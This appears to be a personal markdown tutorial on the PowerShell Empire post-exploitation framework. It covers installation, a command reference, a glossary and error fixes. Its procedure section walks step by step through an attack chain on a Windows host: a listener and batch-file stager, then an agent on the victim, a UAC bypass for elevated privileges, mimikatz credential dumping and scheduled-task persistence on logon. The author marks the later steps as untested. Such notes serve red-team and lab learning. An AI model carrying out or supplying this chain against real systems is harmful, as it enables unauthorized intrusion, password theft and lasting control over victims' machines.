# Powershell Empire Documentation 
### Tazering

#
## **Description**
This is Tazering's Documentation on Powershell Empire.  This documenation will cover the basics of using Powershell Empire and provide resources for additional learning.  Below are some references and resources.

[Powershell Documentation](https://docs.microsoft.com/en-us/powershell/)
###
[Powershell Empire Github](https://github.com/EmpireProject/Empire)
###
[Powershell Empire Ultimate Guide - hackmag](https://hackmag.com/security/powershell-empire/)

#

## **Installation**
### *Way 1: Direct Installation (chosen way)*
1. Open Terminal

2. Update and upgrade your kali linux machine using the following lines in your terminal
    ```bash
    sudo apt-get update #update machine
    sudo apt-get upgrade #upgrade machine
    ```

3. Install Powershell Empire.
    ```bash
    sudo apt-get install powershell-empire #installs your powershell empire
    
    #ALTERNATIVELY

    sudo apt install -y powershell-empire starkiller
    ```

4. When prompted, type "Y" without quotations and enter.
   
5. Update and Upgrade.
   ```bash
    sudo apt-get update #update machine
    sudo apt-get upgrade #upgrade machine
    ```

6. Run Powershell Empire Server
    ```bash
    sudo powershell-empire server #must run a server first so that when you run the client, you have a server to connect to
    ```

7. Run Powershell Empire Client
    ```bash
    sudo powershell-empire client #runs the client and connects it to a server
    ```

### *Way 2: Github Repository*
1. Open Terminal

2. Create a new directory to hold your Powershell Empire Repository
    ```bash
    mkdir myDirectoryName  #replace myDirectoryName with whatever name you choose
    ```

3. Enter into your directory
    ```bash
    cd myDirectoryName #you may need to state the filepath of your directory
    ```

4. Clone Powershell Github Repository to your new directory
    ```bash
    git clone https://github.com/EmpireProject/Empire.git #this will clone the repository into your directory
    ```

5. Enter into the Empire/setup directory
    ```bash
    cd Empire #alternatively, you could type cd Empire/setup
    cd setup
    ```

6. Run the install script
    ```bash
    sudo ./install.sh #it will promps you a password
    ```

7. Type anything when it prompts you the key generation

8. Go back to the Empire directory
    ```bash
    cd Empire
    ```
#
## **Commands**
Run Powershell Empire Server-Side
```bash
sudo powershell-empire server #Runs Powershell Empire Server Side
```

Run Powershell Empire Client-Side
```bash
sudo powershell-empire client #Runs Powershell Empire Client Side
```

Provides a manual of possible scripts to run
```powershell
help #manual about a particular listener
```

List all the listeners
```powershell
listeners #lists all the listeners
```

Use a particular type of listener
```powershell
uselistener meterpreter #uses the meterpreter listener; however, if you want to use a different listener, then change meterpreter to whatever you wish
```

Information about a listener
```powershell
info #lists information about a listener
```

Set a Name for your listener
```powershell
set Name 4nrchy #this command requires one parameter: desired name for your user; sets the name of your listener to whatever you want, just change 4nrcky to your desired name
```

Go back
```powershell
back #just goes back; from listeners/meterpreter to listeners
```

Execute the listener
```powershell
execute # execute the listener; stage will start receiving connections
```

Use a particular type of Stager
```powershell
usestager windows/launcher_bat #this command takes one parameter: the specific stager you want to use; uses a windows/launcher_bat stager; change windows/macro to whatever you desire
```

Lists all agents
```powershell
agents # lists all the agents that are available
```

Rename a particular agent
```powershell
rename 1HVPYFR8 WIN7 #the rename command takes two parameters: the first being the desired agents OLD name, the second being the NEW name for the agent; in this case, the command will rename agent 1HVPYFR8 to WIN7
```

Interact with your agent
```powershell
interact WIN7 #interact with the agent name WIN7
```

*AGENT*: Bypasses user access control 
```powershell
bypassuac WIN7 #this command takes one parameter: the name of the agent you want to execute with; this command bypasses user access control giving the agent elevated privileges
```

*AGENT*: Run mimikatz
```powershell
mimikatz #runs mimikatz which basically gets password from memory; requires elevated privileges; module; may take some time extracting passwords
``` 

*AGENT*: Access database with mimikatz results
```powershell
creds #this command allows the user to access the database that has the results of the mimikatz scan; assumes that mimikatz is successful
```

*AGENT*: Use a particular module
```powershell
usemodule persistence/elevated/schtasks #the usemodule command takes a single parameter: the particular module desired to be used; this allows the user to begin using a module to establish peristence; this particular command uses the persistence/elevated/schtasks module
```

*AGENT*: Change Logon Option
```powershell
set OnLogon True #this command like other setters takes in two parameters: the particular option and then the new value; in this case, we are enabling the script to execute upon logon
```

*AGENT*: Set Listener for Agent
```powershell
set Listener Win7 #this command like other setters takes in two parameters: the particular option and then the new value; in this case, we are changing the listener for this particular agent
```
#
## **Procedures**
*Setup a Listener and Stager*
1. Need to setup listeners
    - list all the listeners
```powershell
listeners #lists all the listeners

back #if you want to go back
```
2. Pick and Use a listener
```powershell
uselistener meterpreter #uses the meterpreter listener; if you want to use a different listener, then change meterpreter to whatever you wish

info #use info if you want information about your listener
```
 
3. Set a your listener parameters
```powershell
set Name 4nrchy # sets the name of your listener to whatever you want, just change the 4nrchy to your desired name
set Host http://192.168.6.1 # sets the host; change http://192.168.6.1 to whatever host you want
set Port 4321 # sets the port that your listener will reside in; change 4321 to your desired port
```

4. Execute the listener
```powershell
execute #execute the listener; stager starts receiving connections
```

5. Setup a stager
```powershell
usestager windows/launcher_bat #uses a windows/launcher_bat stager; change windows/macro to whatever you desire
```
6. Set a Listener
```powershell
set Listener 4nrchy #links stager with listener
```

7. execute
```powershell
execute #executes the stager and listener, at this time, it will give you a bat file
```

--------------------------This point and later will not have been  experimented with yet

*Create Agents*

8. execute the batch file that was produced after downloading it and saving it
    - this will give you a unique identifier
    - an agent to work with

9. lists all the agents
```powershell
agents # lists all the available agents
```

10. rename the agent
```powershell
rename 1HVPYFR8 WIN7 #rename your particular agent to your desired name; the rename command takes two parameters, the first parameter is for the desired agents OLD name and the second parameter is the NEW name you want to replace your agent's name with; in this case we wanted to rename the agent 1HVPYFR8 to WIN7
```

11. interact with your particular agent
```powershell
interact WIN7 #interact with the agent name WIN7
```
    - you can use help to see possible commands with your agent
    - you can use various linux commands as your agent
    - info for additional info about your agent
    - the goal of this is to estabilish persistance
        one of the most important information is the high_integrity which indicates whether your agent has admin privileges or not
        greater value means greater privileges

*Strengthening the Agent*

12. bypass user access control for elevated privileges
```powershell
bypassuac WIN7 #this command takes one parameter: the name of the agent you want to execute with; this command bypasses user access control giving the agent elevated privileges
```
- this will create a NEW agent with elevated privileges

13. rename your NEW agent with elevated privileges
```powershell
rename PY5MW1X9 WIN7AD #rename your particular agent to your desired name; the rename command takes two parameters, the first parameter is for the desired agents OLD name and the second parameter is the NEW name you want to replace your agent's name with; in this case we wanted to rename PY5MW1X9 to WIN7AD
```
- this new agent will have a GREATER privilege than the original agent

14. interact with the NEW agent
```powershell
interact WIN7AD #interact with this new agent with elevated privileges
```

15. see the information
```powershell
info
```

*Harvesting Credentials*
16. run mimikatz
```powershell
mimikatz #runs mimikatz which basically gets password from memory; requires elevated privileges; module; may take some time extracting passwords
```

17. see the database from the mimikatz scan
```powershell
creds #this command allows the user to access the database that has the results of the mimikatz scan; assumes that mimikatz is successful
```

*Establishing Persistence (IMPORTANT)*
18. use a module
```powershell
usemodule persistence/elevated/schtasks #the usemodule command takes a single parameter: the particular module desired to be used; this allows the user to begin using a module to establish peristence
```

19. set the option so that the script runs upon logon
```powershell
set OnLogon True #this command like other setters takes in two parameters: the particular option and then the new value; in this case, we are enabling the script to execute upon logon
```

20. set the listener
```powershell
set Listener Win7 #this command like other setters takes in two parameters: the particular option and then the new value; in this case, we are changing the listener for this particular agent
```

21. execute
```powershell
execute #execute the module
```
#
## **Terminology**
**Listener**: listens for specific connections

**Stager**: executable that will facilitate malicious codes to run on the host

**Agent**: maintains connection with target by supplying information

**Modules**: malicious pieces of code that extend functionality on target and sorted based on functionality

**Mimikatz**: post-exploitation tool where it dumps passwords, hashes, bins, and others from memory; depends on OS on success rate; gets passwords from memory

**Persistence**: maintaining connection to victim computer regardless of the computer's state

#
## **Errors**
### *Failed to Establish Connection*
When you run the 
```bash
sudo powershell-empire client 
```
and receive the message
```error
[!] Error: <urllib3.connection.HTTPSConnection object at 0x7f14a009e0a0>: Failed to establish a new connection: [Errno 111] Connection refused
```
This usually results from not running the server before running the client.  In order to fix run this command first: 
```bash
sudo powershell-empire server #Runs Powershell Empire Server Side
```

Then you run:
```bash
sudo powershell-empire client #Runs Powershell Empire Client Side
```
in a separate window.

### *Failed to validate listener*
When you get the 
```powershell
failed to validate listener dropbox options
```
after trying to execute the listener.

Then you need to set the parameters of the listener by using these lines:
```powershell
set Host http://192.168.6.1 # sets the host; change http://192.168.6.1 to whatever host you want
set Port 4321 # sets the port that your listener will reside in; change 4321 to your desired port
```

